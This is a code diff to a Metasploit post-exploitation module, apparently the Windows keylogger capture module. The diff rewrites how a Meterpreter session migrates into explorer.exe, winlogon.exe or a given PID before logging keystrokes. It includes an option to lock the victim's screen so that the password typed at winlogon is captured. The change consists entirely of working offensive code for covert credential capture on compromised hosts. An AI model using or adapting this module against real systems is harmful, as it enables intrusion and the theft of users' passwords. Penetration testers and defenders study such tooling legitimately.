@@ -51,20 +51,14 @@ class MetasploitModule < Msf::Post
 
     print_status("Executing module against #{sysinfo['Computer']}")
     if datastore['MIGRATE']
-      case datastore['CAPTURE_TYPE']
-      when "explorer"
-        process_migrate(datastore['CAPTURE_TYPE'],datastore['LOCKSCREEN'])
-      when "winlogon"
-        process_migrate(datastore['CAPTURE_TYPE'],datastore['LOCKSCREEN'])
-      when "pid"
-        if datastore['PID'] and has_pid?(datastore['PID'])
-          pid_migrate(datastore['PID'])
-        else
-          print_error("If capture type is pid you must provide a valid one")
-          return
+      if datastore['CAPTURE_TYPE'] == "pid"
+        if  !migrate_pid(datastore['PID'], session.sys.process.getpid)
+          print_error("Unable to migrate to given PID. Using Explorer instead.")
+          process_migrate
         end
+      else
+        return unless process_migrate
       end
-
     end
 
     if startkeylogger
@@ -87,42 +81,107 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  # Method to Migrate in to Explorer process to be able to interact with desktop
-  def process_migrate(captype,lock)
-    print_status("Migration type #{captype}")
-    #begin
-    if captype == "explorer"
-      process2mig = "explorer.exe"
-    elsif captype == "winlogon"
+  # This function evaluates the capture type and migrates accordingly.
+  # In the event of errors, it will default to the explorer capture type.
+  #
+  # @return [TrueClass] if it successfully migrated
+  # @return [FalseClass] if it failed to migrate
+  def process_migrate
+    captype = datastore['CAPTURE_TYPE']
+
+    if captype == "winlogon"
       if is_uac_enabled? and not is_admin?
-        print_error("UAC is enabled on this host! Winlogon migration will be blocked.")
-
-      end
-      process2mig = "winlogon.exe"
-      if lock
-        lock_screen
-      end
-    else
-      process2mig = "explorer.exe"
-    end
-    # Actual migration
-    mypid = session.sys.process.getpid
-    session.sys.process.get_processes().each do |x|
-      if (process2mig.index(x['name'].downcase) and x['pid'] != mypid)
-        print_status("\t#{process2mig} Process found, migrating into #{x['pid']}...")
-        session.core.migrate(x['pid'].to_i)
-        print_status("Migration successful!!")
+        print_error("UAC is enabled on this host! Winlogon migration will be blocked. Using Explorer instead.")
+      else
+        success = migrate(get_pid("winlogon.exe"), "winlogon.exe", session.sys.process.getpid)
+        if datastore['LOCKSCREEN'] && success
+          lock_screen
+          return success
+        end
+        return success
       end
     end
-    return true
+
+    return migrate(get_pid("explorer.exe"), "explorer.exe", session.sys.process.getpid)
   end
 
-  # Method for migrating in to a PID
-  def pid_migrate(pid)
-    print_status("\tMigrating into #{pid}...")
-    session.core.migrate(pid)
-    print_status("Migration successful!")
+  # This function returns the first process id of a process with the name provided.
+  # It will make sure that the process has a visible user meaning that the session has rights to that process.
+  # Note: "target_pid = session.sys.process[proc_name]" will not work when "include Msf::Post::Windows::Priv" is in the module.
+  #
+  # @return [Fixnum] the PID if one is found
+  # @return [NilClass] if no PID was found
+  def get_pid(proc_name)
+    processes = client.sys.process.get_processes
+    processes.each do |proc|
+      if proc['name'] == proc_name && proc['user'] != ""
+        return proc['pid']
+      end
+    end
+    return nil
   end
+
+  # This function attempts to migrate to the specified process by Name.
+  #
+  # @return [TrueClass] if it successfully migrated
+  # @return [FalseClass] if it failed to migrate
+  def migrate(target_pid, proc_name, current_pid)
+    if !target_pid
+      print_error("Could not migrate to #{proc_name}.")
+      return false
+    end
+
+    print_status("Trying #{proc_name} (#{target_pid})")
+
+    if target_pid == current_pid
+      print_good("Already in #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
+      return true
+    end
+
+    begin
+      client.core.migrate(target_pid)
+      print_good("Successfully migrated to #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
+      return true
+    rescue ::Rex::Post::Meterpreter::RequestError => error
+      print_error("Could not migrate to #{proc_name}.")
+      print_error(error.to_s)
+      return false
+    end
+  end
+
+  # This function attempts to migrate to the specified process by PID only.
+  #
+  # @return [TrueClass] if it successfully migrated
+  # @return [FalseClass] if it failed to migrate
+  def migrate_pid(target_pid, current_pid)
+    if !target_pid
+      print_error("Could not migrate to PID #{target_pid}.")
+      return false
+    end
+
+    if !has_pid?(target_pid)
+      print_error("Could not migrate to PID #{target_pid}. Does not exist!")
+      return false
+    end
+
+    print_status("Trying PID: #{target_pid}")
+
+    if target_pid == current_pid
+      print_good("Already in #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
+      return true
+    end
+
+    begin
+      client.core.migrate(target_pid)
+      print_good("Successfully migrated to #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
+      return true
+    rescue ::Rex::Post::Meterpreter::RequestError => error
+      print_error("Could not migrate to PID #{target_pid}.")
+      print_error(error.to_s)
+      return false
+    end
+  end
+
 
   # Method for starting the keylogger
   def startkeylogger()
